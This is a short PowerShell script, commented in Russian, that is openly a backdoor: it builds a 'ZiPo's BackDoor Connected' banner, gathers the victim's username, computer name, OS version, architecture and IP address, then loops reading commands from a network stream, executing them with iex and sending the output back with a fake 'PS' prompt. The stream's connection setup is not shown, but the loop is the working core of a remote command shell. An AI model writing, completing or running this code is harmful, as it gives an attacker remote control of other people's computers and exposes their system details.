# Сначала накапливаем инфу в $sendback
$sendback = @"
███████╗██╗██████╗  ██████╗ ███████╗
██╔════╝██║██╔══██╗██╔════╝ ██╔════╝
███████╗██║██████╔╝██║  ███╗█████╗  
╚════██║██║██╔═══╝ ██║   ██║██╔══╝  
███████║██║██║     ╚██████╔╝███████╗
╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
ZiPo's BackDoor Connected

Username: $env:USERNAME
Computer: $env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Architecture: $env:PROCESSOR_ARCHITECTURE
IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)

---------------------------------------------------
"@

# Потом запускаем цикл и добавляем вывод команд
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $result = (iex $data 2>&1 | Out-String );
  $sendback += $result + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
  $sendback = ""
}
